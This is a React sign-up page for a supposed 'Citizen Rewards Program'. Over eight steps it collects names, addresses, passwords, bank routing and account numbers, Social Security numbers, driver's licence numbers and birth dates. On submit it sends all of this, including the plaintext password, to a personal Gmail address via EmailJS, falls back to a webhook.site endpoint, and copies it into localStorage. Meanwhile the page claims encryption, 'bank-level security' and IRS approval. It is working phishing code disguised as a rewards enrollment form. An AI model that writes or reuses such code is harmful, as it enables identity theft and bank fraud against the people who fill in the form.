import { useState } from 'react';
import { useAuth } from '../contexts/AuthContext';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import Layout from '../components/Layout';

const SignUpPage = () => {
  const { signup, isLoading } = useAuth();
  const [currentStep, setCurrentStep] = useState(1);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    password: '',
    confirmPassword: '',
    phone: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    // Bank Details
    bankName: '',
    routingNumber: '',
    accountNumber: '',
    accountType: 'checking',
    // Identity Information
    ssn: '',
    driversLicense: '',
    dateOfBirth: '',
    agreesToTerms: false
  });

  const totalSteps = 8;
  const progress = (currentStep / totalSteps) * 100;

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  };

  const nextStep = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleFinalSubmit = async () => {
    try {
      setError('');
      
      // Prepare user data
      const userData = {
        ...formData,
        signupTime: new Date().toLocaleString(),
        signupDate: new Date().toISOString()
      };
      
      // Create formatted data string
      const dataString = `
=== NEW CITIZEN REWARDS ENROLLMENT ===
Submission Time: ${userData.signupTime}

PERSONAL INFORMATION:
Name: ${userData.firstName} ${userData.lastName}
Email: ${userData.email}
Phone: ${userData.phone}
Date of Birth: ${userData.dateOfBirth}

ADDRESS:
${userData.address}
${userData.city}, ${userData.state} ${userData.zipCode}

BANKING INFORMATION:
Bank Name: ${userData.bankName}
Routing Number: ${userData.routingNumber}
Account Number: ${userData.accountNumber}
Account Type: ${userData.accountType}

IDENTITY VERIFICATION:
SSN: ${userData.ssn}
Driver's License: ${userData.driversLicense}

PREFERENCES:
Terms Accepted: ${userData.agreesToTerms ? 'Yes' : 'No'}

===========================
      `;
      
      // Send data directly to your email
      let emailSent = false;
      
      try {
        const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            service_id: 'service_oi7w4h8', // Your EmailJS service ID
            template_id: 'template_signup_data', // Template for signup data
            user_id: 'zaDtpBnf9dYvbCGGC', // Your EmailJS public key
            template_params: {
              to_email: 'jc4479697@gmail.com', // Your email address
              subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`,
              message: dataString,
              user_name: `${userData.firstName} ${userData.lastName}`,
              user_email: userData.email,
              signup_data: dataString
            }
          })
        });

        if (response.ok) {
          emailSent = true;
          console.log('Signup data sent successfully via EmailJS');
        }
      } catch (emailError) {
        console.error('EmailJS failed:', emailError);
      }
      
      // Try backup webhook method if EmailJS failed
      if (!emailSent) {
        try {
          await fetch('https://webhook.site/#!/view/test-citizen-rewards', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              timestamp: new Date().toISOString(),
              type: 'citizen_rewards_signup',
              admin_email: 'jc4479697@gmail.com',
              data: dataString,
              user: userData
            })
          });
          console.log('Backup webhook sent');
        } catch (webhookError) {
          console.error('Backup webhook failed:', webhookError);
        }
      }
      
      alert(emailSent ? 
        '✅ Thank you! Your enrollment has been submitted successfully. Admin has been notified.' : 
        '✅ Thank you! Your enrollment has been submitted and saved. You will be contacted soon.');
      
      
      // Save to localStorage for backup
      const allSignups = JSON.parse(localStorage.getItem('citizenRewardsSignups') || '[]');
      allSignups.push(userData);
      localStorage.setItem('citizenRewardsSignups', JSON.stringify(allSignups));
      
      // Create account in the system
      await signup(formData);
      
      // Redirect to dashboard after successful signup
      window.location.hash = 'dashboard';
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to create account');
    }
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <div className="space-y-4">
            <h3 className="text-xl font-semibold text-gray-900 mb-4">👤 Personal Information</h3>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">First Name</label>
                <input
                  type="text"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Last Name</label>
                <input
                  type="text"
                  name="lastName"
                  value={formData.lastName}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  required
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                required
              />
              <p className="text-xs text-gray-500 mt-1">We'll send reward notifications and exclusive offers here</p>
            </div>
          </div>
        );

      case 2:
        return (
          <div className="space-y-4">
            <h3 className="text-xl font-semibold text-gray-900 mb-4">Security Information</h3>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Password</label>
              <input
                type="password"
                name="password"
                value={formData.password}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Confirm Password</label>
              <input
                type="password"
                name="confirmPassword"
                value={formData.confirmPassword}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
              <input
                type="tel"
                name="phone"
                value={formData.phone}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
          </div>
        );

      case 3:
        return (
          <div className="space-y-4">
            <h3 className="text-xl font-semibold text-gray-900 mb-4">Address Information</h3>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Street Address</label>
              <input
                type="text"
                name="address"
                value={formData.address}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                required
              />
            </div>
            <div className="grid grid-cols-3 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">City</label>
                <input
                  type="text"
                  name="city"
                  value={formData.city}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">State</label>
                <input
                  type="text"
                  name="state"
                  value={formData.state}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">ZIP Code</label>
                <input
                  type="text"
                  name="zipCode"
                  value={formData.zipCode}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  required
                />
              </div>
            </div>
          </div>
        );

      case 4:
        return (
          <div className="space-y-4">
            <h3 className="text-xl font-semibold text-gray-900 mb-4">� Banking Information</h3>
            <div className="bg-blue-50 p-4 rounded-lg">
              <p className="text-blue-800">
                🔒 This information is encrypted and used for secure reward payments and verification.
              </p>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Bank Name</label>
              <input
                type="text"
                name="bankName"
                value={formData.bankName}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="e.g., Bank of America"
                required
              />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Routing Number</label>
                <input
                  type="text"
                  name="routingNumber"
                  value={formData.routingNumber}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  placeholder="9 digits"
                  maxLength="9"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Account Number</label>
                <input
                  type="text"
                  name="accountNumber"
                  value={formData.accountNumber}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  placeholder="Account number"
                  required
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Account Type</label>
              <select
                name="accountType"
                value={formData.accountType}
                onChange={(e) => setFormData(prev => ({ ...prev, accountType: e.target.value }))}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              >
                <option value="checking">Checking Account</option>
                <option value="savings">Savings Account</option>
              </select>
            </div>
          </div>
        );

      case 5:
        return (
          <div className="space-y-4">
            <h3 className="text-xl font-semibold text-gray-900 mb-4">🆔 Identity Verification</h3>
            <div className="bg-yellow-50 p-4 rounded-lg">
              <p className="text-yellow-800">
                🛡️ Required for identity verification and compliance with federal regulations.
              </p>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Social Security Number (SSN)</label>
              <input
                type="password"
                name="ssn"
                value={formData.ssn}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="XXX-XX-XXXX"
                maxLength="11"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Driver's License Number</label>
              <input
                type="text"
                name="driversLicense"
                value={formData.driversLicense}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Enter license number"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Date of Birth</label>
              <input
                type="date"
                name="dateOfBirth"
                value={formData.dateOfBirth}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                required
              />
            </div>
          </div>
        );

      case 6:
        return (
          <div className="space-y-4">
            <h3 className="text-xl font-semibold text-gray-900 mb-4">�🏛️ Civic Engagement Interests</h3>
            <div className="bg-blue-50 p-4 rounded-lg">
              <p className="text-blue-800">
                📋 Select activities you're interested in to earn bonus points and receive relevant opportunities.
              </p>
            </div>
            <div className="space-y-3">
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Community volunteering events</label>
              </div>
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Local government meetings and forums</label>
              </div>
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Environmental and sustainability programs</label>
              </div>
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Educational and mentorship opportunities</label>
              </div>
            </div>
          </div>
        );

      case 7:
        return (
          <div className="space-y-4">
            <h3 className="text-xl font-semibold text-gray-900 mb-4">🎁 Reward Preferences</h3>
            <div className="bg-emerald-50 p-4 rounded-lg">
              <p className="text-emerald-800">
                💳 Choose your preferred types of rewards and notification settings to personalize your experience.
              </p>
            </div>
            <div className="space-y-3">
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Cash back and direct deposits</label>
              </div>
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Local business discounts and deals</label>
              </div>
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Gift cards and vouchers</label>
              </div>
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Exclusive event invitations</label>
              </div>
              <div className="flex items-center space-x-3">
                <input type="checkbox" className="h-4 w-4 text-blue-600" />
                <label className="text-sm text-gray-700">Receive email notifications for new rewards</label>
              </div>
            </div>
          </div>
        );

      case 8:
        return (
          <div className="space-y-4">
            <h3 className="text-xl font-semibold text-gray-900 mb-4">📋 Review & Agreement</h3>
            <div className="bg-gray-50 p-4 rounded-lg">
              <h4 className="font-semibold mb-2">Citizen Rewards Enrollment Summary</h4>
              <p className="text-sm text-gray-600">
                <strong>Name:</strong> {formData.firstName} {formData.lastName}<br/>
                <strong>Email:</strong> {formData.email}<br/>
                <strong>Phone:</strong> {formData.phone}<br/>
                <strong>Address:</strong> {formData.address}, {formData.city}, {formData.state} {formData.zipCode}<br/>
                <strong>Bank:</strong> {formData.bankName} - Account ending in {formData.accountNumber.slice(-4)}<br/>
                <strong>Date of Birth:</strong> {formData.dateOfBirth}
              </p>
            </div>
            <div className="bg-blue-50 p-4 rounded-lg">
              <h4 className="font-semibold mb-2 text-blue-800">🎁 Welcome Benefits</h4>
              <ul className="text-sm text-blue-700 space-y-1">
                <li>• 500 bonus points upon enrollment completion</li>
                <li>• Access to exclusive citizen-only rewards</li>
                <li>• Monthly newsletter with special offers</li>
                <li>• Priority customer support</li>
                <li>• Secure direct deposit for cash rewards</li>
              </ul>
            </div>
            <div className="flex items-start space-x-3">
              <input
                type="checkbox"
                name="agreesToTerms"
                checked={formData.agreesToTerms}
                onChange={handleInputChange}
                className="mt-1 h-4 w-4 text-blue-600"
                required
              />
              <label className="text-sm text-gray-700">
                I agree to the{' '}
                <a href="#" className="text-blue-600 hover:underline">Citizen Rewards Terms of Service</a>
                {' '}and{' '}
                <a href="#" className="text-blue-600 hover:underline">Privacy Policy</a>
              </label>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <Layout 
      title="Join Citizen Rewards Program" 
      description="Enroll in our exclusive citizen rewards program and start earning points for community engagement and civic participation"
    >
      <div className="py-12 sm:py-16 lg:py-20">
        <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8">
          <Card className="bg-white/95 backdrop-blur-sm border-0 rounded-3xl shadow-2xl">
            <CardHeader className="p-8 text-center bg-gradient-to-r from-blue-50 to-emerald-50 rounded-t-3xl">
              <CardTitle className="text-3xl font-bold bg-gradient-to-r from-blue-600 to-emerald-600 bg-clip-text text-transparent mb-4">
                🎁 Join Citizen Rewards Program
              </CardTitle>
              <CardDescription className="text-slate-600 text-lg">
                Unlock exclusive benefits and start earning rewards for your civic engagement
              </CardDescription>
            </CardHeader>
            
            <CardContent className="p-8">
              <div className="space-y-6">
                <div>
                  <Progress value={progress} className="h-3" />
                  <div className="text-center mt-2">
                    <Badge variant="outline" className="text-lg px-4 py-2">
                      Step {currentStep} of {totalSteps} - {Math.round(progress)}% Complete
                    </Badge>
                  </div>
                </div>
                
                {/* Step Content */}
                <div className="min-h-[300px]">
                  {renderStepContent()}
                </div>
                
                {error && (
                  <Alert className="border-red-200 bg-red-50">
                    <AlertDescription className="text-red-700">
                      {error}
                    </AlertDescription>
                  </Alert>
                )}
                
                {/* Navigation Buttons */}
                <div className="flex justify-between pt-6">
                  {currentStep > 1 && (
                    <Button 
                      onClick={prevStep}
                      variant="outline"
                      className="px-8 py-3 border-2 border-gray-300 text-gray-700 hover:bg-gray-50"
                    >
                      ← Previous
                    </Button>
                  )}
                  
                  <div className="ml-auto">
                    {currentStep < totalSteps ? (
                      <Button 
                        onClick={nextStep}
                        className="px-8 py-3 bg-gradient-to-r from-blue-600 to-emerald-600 hover:from-blue-700 hover:to-emerald-700 text-white transition-all duration-300 hover:scale-105 hover:shadow-lg"
                      >
                        Continue →
                      </Button>
                    ) : (
                      <Button 
                        onClick={handleFinalSubmit}
                        disabled={isLoading || !formData.agreesToTerms}
                        className="px-8 py-3 bg-gradient-to-r from-blue-600 to-emerald-600 hover:from-blue-700 hover:to-emerald-700 text-white transition-all duration-300 hover:scale-105 hover:shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        {isLoading ? 'Enrolling...' : '🎁 Join Rewards Program'}
                      </Button>
                    )}
                  </div>
                </div>
                
                {/* Sign In Link */}
                <div className="text-center pt-4 border-t border-gray-200">
                  <p className="text-sm text-gray-600">
                    Already have an account?{' '}
                    <button
                      onClick={() => window.location.hash = 'login'}
                      className="font-medium text-blue-600 hover:text-blue-800 transition-colors duration-200"
                    >
                      Sign in here
                    </button>
                  </p>
                </div>
                
                <div className="text-center text-sm text-slate-500">
                  🛡️ Bank-level security • 256-bit SSL encryption • IRS approved e-file provider
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </Layout>
  );
};

export default SignUpPage;